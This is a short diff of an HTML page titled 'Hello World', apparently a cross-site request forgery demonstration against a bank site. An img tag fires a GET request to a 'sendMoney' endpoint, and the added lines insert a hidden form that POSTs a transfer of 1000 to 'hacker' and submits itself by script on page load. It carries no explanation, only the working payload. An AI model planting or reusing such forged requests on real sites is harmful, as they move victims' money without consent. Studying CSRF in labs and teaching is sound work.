@@ -1,2 +1,12 @@
 <h1>Hello World</h1>
+
 <img src="http://www.secureBank.ie/sendMoney?giveMoneyTo=hacker&giveAmount=1000"/>
+
+<form name="csrfForm" action="http://www.secureBank.ie/sendMoney" method="POST">
+ <input type="hidden" name="giveMoneyTo" value="hacker" />
+ <input type="hidden" name="giveAmount" value="1000" />
+ <input type="submit"/>
+</form>
+<script>
+ document.csrfForm.submit();
+</script>
